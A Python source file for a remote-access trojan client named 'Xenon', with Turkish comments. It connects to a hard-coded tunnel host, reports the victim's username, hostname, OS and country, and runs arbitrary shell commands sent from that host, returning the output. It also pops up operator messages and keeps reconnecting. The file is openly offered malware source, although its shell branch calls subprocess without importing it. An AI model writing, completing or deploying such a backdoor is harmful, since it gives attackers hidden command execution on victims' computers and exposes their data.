import socket
import platform
import getpass
import json
import time
import urllib.request
import tkinter as tk
from tkinter import messagebox

class XenonClient:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port

    def get_recon_data(self):
        recon = {"id": f"{getpass.getuser()}@{platform.node()}", "os": f"{platform.system()} {platform.release()}", "country": "Unknown"}
        try:
            with urllib.request.urlopen("http://ip-api.com/json/", timeout=3) as response:
                recon["country"] = json.loads(response.read().decode()).get("countryCode", "??")
        except: recon["country"] = "N/A"
        return recon

    def run(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.server_ip, self.server_port))
                # İlk veri gönderimi
                self.sock.send(json.dumps(self.get_recon_data()).encode("utf-8"))
                
                while True:
                    data = self.sock.recv(4096).decode("utf-8")
                    if not data: break
                    
                    # KOMUT AYRIŞTIRICI
                    if data.startswith("msg|"):
                        msg_content = data.split("|")[1]
                        root = tk.Tk(); root.withdraw(); root.attributes("-topmost", True)
                        messagebox.showinfo("Xenon System", msg_content)
                        root.destroy()
                    
                    elif data.startswith("shell|"):
                        cmd = data.split("|")[1]
                        # Komutu çalıştır ve çıktıyı al
                        output = subprocess.getoutput(cmd)
                        if not output: output = "Komut çalıştırıldı (Çıktı yok)."
                        self.sock.send(output.encode("utf-8"))

            except:
                time.sleep(5) # Bağlantı koparsa 5 sn bekle
            finally:
                try: self.sock.close()
                except: pass

if __name__ == "__main__":
    client = XenonClient("uwtd3ffva.localto.net", 6522)
    client.run()

